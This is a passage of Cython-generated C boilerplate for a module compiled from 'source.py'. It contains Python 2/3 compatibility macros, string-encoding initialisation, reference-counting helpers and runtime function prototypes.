  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* decode_c_string_utf16.proto */
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16(const char *s, Py_ssize_t size, const char *errors) {
    int byteorder = 0;
    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);
}
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16LE(const char *s, Py_ssize_t size, const char *errors) {
    int byteorder = -1;
    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);
}
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16BE(const char *s, Py_ssize_t size, const char *errors) {
    int byteorder = 1;
    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);
}

/* decode_c_bytes.proto */
static CYTHON_INLINE PyObject* __Pyx_decode_c_bytes(
         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,
         const char* encoding, const char* errors,
         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors));

/* decode_bytes.proto */
static CYTHON_INLINE PyObject* __Pyx_decode_bytes(
         PyObject* string, Py_ssize_t start, Py_ssize_t stop,
         const char* encoding, const char* errors,
         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {
    return __Pyx_decode_c_bytes(
        PyBytes_AS_STRING(string), PyBytes_GET_SIZE(string),
        start, stop, encoding, errors, decode_func);
}

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* GetItemInt.proto */
#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);

/* SliceObject.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(
        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,
        int has_cstart, int has_cstop, int wraparound);

/* PyObjectLookupSpecial.proto */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {
    PyObject *res;
    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return __Pyx_PyObject_GetAttrStr(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#else
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
